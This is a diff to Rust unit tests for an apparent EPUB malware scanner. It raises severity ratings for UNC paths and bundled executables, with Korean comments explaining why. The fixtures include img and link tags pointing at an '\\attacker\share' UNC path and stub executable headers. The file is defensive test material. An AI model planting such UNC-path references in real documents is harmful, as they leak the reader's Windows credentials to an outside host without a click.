@@ -144,8 +144,11 @@ fn ordinary_links_are_clean() {
 
 #[test]
 fn unc_paths_are_flagged() {
-    let r = scan_chapter(r#"<img src="\\attacker\share\a.png">"#);
+    // 클릭해야 열리는 링크는 High, 자원으로 자동 로드되면 클릭 없이 인증 정보가 나가므로 Critical이다.
+    let r = scan_chapter(r#"<a href="\\attacker\share\a.png">x</a>"#);
     assert_eq!(severity_of(&r, "UNC_PATH"), Severity::High);
+    let r = scan_chapter(r#"<img src="\\attacker\share\a.png">"#);
+    assert_eq!(severity_of(&r, "UNC_PATH"), Severity::Critical);
 }
 
 #[test]
@@ -270,11 +273,11 @@ fn long_hex_escape_runs_count_as_obfuscation() {
 
 #[test]
 fn executable_extensions_and_magic_bytes_are_flagged() {
-    assert_eq!(severity_of(&scan_extra("OEBPS/x.exe", b"hello"), "EMBEDDED_EXECUTABLE"), Severity::High);
+    assert_eq!(severity_of(&scan_extra("OEBPS/x.exe", b"hello"), "EMBEDDED_EXECUTABLE"), Severity::Critical);
     assert!(has(&scan_extra("OEBPS/run.sh", b"echo"), "EMBEDDED_EXECUTABLE"));
-    // 실행 파일 확장자의 PE·ELF·Mach-O는 번들된 설치 파일일 수 있어 High·Medium이고, 다른 확장자로 위장하면 Critical이다.
-    assert_eq!(severity_of(&scan_extra("OEBPS/a.exe", b"MZ\x90\x00more"), "PE_EXECUTABLE_CONTENT"), Severity::High);
-    assert_eq!(severity_of(&scan_extra("OEBPS/a.so", b"\x7fELF\x02\x01"), "ELF_BINARY_CONTENT"), Severity::Medium);
+    // 번들 실행 파일은 확장자로 위장했든 아니든 전부 Critical이다.
+    assert_eq!(severity_of(&scan_extra("OEBPS/a.exe", b"MZ\x90\x00more"), "PE_EXECUTABLE_CONTENT"), Severity::Critical);
+    assert_eq!(severity_of(&scan_extra("OEBPS/a.so", b"\x7fELF\x02\x01"), "ELF_BINARY_CONTENT"), Severity::Critical);
     assert_eq!(severity_of(&scan_extra("OEBPS/a.jpg", b"MZ\x90\x00more"), "PE_EXECUTABLE_CONTENT"), Severity::Critical);
     assert_eq!(severity_of(&scan_extra("OEBPS/a.jpg", b"\x7fELF\x02\x01"), "ELF_BINARY_CONTENT"), Severity::Critical);
     assert_eq!(severity_of(&scan_extra("OEBPS/a.jpg", b"\xcf\xfa\xed\xfe\x07"), "MACHO_BINARY_CONTENT"), Severity::Critical);
